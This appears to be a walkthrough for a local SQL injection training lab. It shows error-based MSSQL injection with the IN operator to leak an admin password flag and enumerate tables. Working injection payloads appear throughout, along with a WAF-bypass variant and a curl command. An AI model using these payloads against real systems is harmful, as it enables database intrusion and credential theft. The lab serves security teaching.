<h4>Step 1: Test Normal Search</h4>
<p>Search for products by category to see normal behavior.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>Electronics<br>
        <span class="prompt">SQL: </span>SELECT id, name, price, category FROM products WHERE category = 'Electronics'<br><br>
        <span class="prompt">Output:</span><br>
        1 | Laptop Pro 15 | $1299.99 | Electronics<br>
        2 | Wireless Mouse | $29.99 | Electronics<br>
        3 | USB-C Hub | $49.99 | Electronics<br>
        6 | Mechanical Keyboard | $149.99 | Electronics<br>
        7 | Monitor 27&quot; | $399.99 | Electronics
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''.</strong>
    </div>
</div>

<h4>Step 3: Understand the IN Operator Technique</h4>
<p>
    When <code>1 IN (SELECT varchar_column ...)</code> is evaluated, MSSQL tries to compare
    the integer <code>1</code> with a string. If the string can't be converted to an integer,
    the error leaks the string value. This is an alternative to CONVERT/CAST.
</p>

<h4>Step 4: Extract the Admin Password</h4>
<p>
    <strong>Important:</strong> The AND condition is only evaluated when the first part of the
    WHERE clause matches rows. Use a valid category like "Electronics" as the prefix.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. IN Operator Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>Electronics' AND 1 IN (SELECT password FROM users WHERE username='admin') -- -<br><br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Conversion failed when converting the varchar value 'FLAG{ms_1n_0p3r4t0r_3rr0r}' to data type int.</strong>
    </div>
</div>

<p>The admin password leaks directly in the conversion error!</p>

<h4>Step 5: Why the Category Prefix Matters</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Short-Circuit Behavior</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// With empty category -- AND is never evaluated:</span><br>
        <span class="prompt">Input: </span>' AND 1 IN (SELECT password FROM users WHERE username='admin') -- -<br>
        <span class="prompt">Result: </span><strong>No products found in that category.</strong> (no error -- AND short-circuited)<br><br>
        <span class="prompt">// With valid category -- AND IS evaluated:</span><br>
        <span class="prompt">Input: </span>Electronics' AND 1 IN (SELECT password FROM users WHERE username='admin') -- -<br>
        <span class="prompt">Result: </span><strong>MSSQL Error: Conversion failed when converting the varchar value 'FLAG{ms_1n_0p3r4t0r_3rr0r}' to data type int.</strong>
    </div>
</div>

<h4>Step 6: Enumerate Tables via IN Operator</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Table Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Find other tables:</span><br>
        <span class="prompt">Input: </span>Electronics' AND 1 IN (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME != 'products') -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>users</strong>' to data type int.
    </div>
</div>

<h4>Step 7: Compare with CONVERT Approach</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Technique Comparison</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">CONVERT: </span>Electronics' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users WHERE username='admin')) -- -<br>
        <span class="prompt">CAST:    </span>Electronics' AND 1=CAST((SELECT TOP 1 password FROM users WHERE username='admin') AS INT) -- -<br>
        <span class="prompt">IN:      </span>Electronics' AND 1 IN (SELECT password FROM users WHERE username='admin') -- -<br><br>
        <span class="prompt">// All three produce the same error. IN is useful when CONVERT/CAST are WAF-blocked.</span>
    </div>
</div>

<h4>Step 8: Submit the Password</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{ms_1n_0p3r4t0r_3rr0r}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab3" \<br> --data-urlencode "category=Electronics' AND 1 IN (SELECT password FROM users WHERE username='admin') -- -"<br><br>
        <span class="prompt"># Verified output:</span><br>
        MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_1n_0p3r4t0r_3rr0r}' to data type int.
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> The <code>IN</code> operator provides an alternative error-based
    extraction channel on MSSQL. When an integer is compared against a string subquery, the type
    conversion error leaks the string value. This bypasses WAF rules that only block
    <code>CONVERT</code> and <code>CAST</code> keywords. Note that MSSQL may short-circuit AND
    conditions: ensure the left side of AND returns rows so the right side is evaluated.
    Always use parameterized queries to prevent all forms of injection.
</div>
